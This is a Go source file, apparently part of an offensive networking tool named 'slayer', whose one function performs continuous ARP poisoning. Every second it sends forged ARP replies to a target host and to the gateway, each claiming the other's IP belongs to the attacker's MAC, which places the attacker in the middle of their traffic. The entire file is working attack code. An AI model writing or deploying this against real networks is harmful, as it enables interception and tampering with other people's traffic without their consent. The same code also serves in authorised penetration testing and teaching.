package spoof

import (
	"fmt"
	"net"
	"time"

	"github.com/prabalesh/slayer/internal/networking/arp"
)

// Spoof performs continuous ARP poisoning
func Spoof(iface *net.Interface, targetIP net.IP, targetMAC net.HardwareAddr, gatewayIP net.IP, gatewayMAC net.HardwareAddr) {
	attackerMAC := iface.HardwareAddr

	fmt.Println("[*] Starting ARP spoofing... Press Ctrl+C to stop.")

	for {
		// Poison target: "Gateway is at our MAC"
		packet1 := arp.BuildPacket(attackerMAC, targetMAC, gatewayIP, targetIP, 2)
		if err := arp.Send(iface, packet1, targetMAC); err != nil {
			fmt.Printf("[!] Failed to send ARP to target: %v\n", err)
		}

		// Poison gateway: "Target is at our MAC"
		packet2 := arp.BuildPacket(attackerMAC, gatewayMAC, targetIP, gatewayIP, 2)
		if err := arp.Send(iface, packet2, gatewayMAC); err != nil {
			fmt.Printf("[!] Failed to send ARP to gateway: %v\n", err)
		}

		fmt.Println("[+] Sent spoofed ARP packets")

		time.Sleep(1 * time.Second)
	}
}
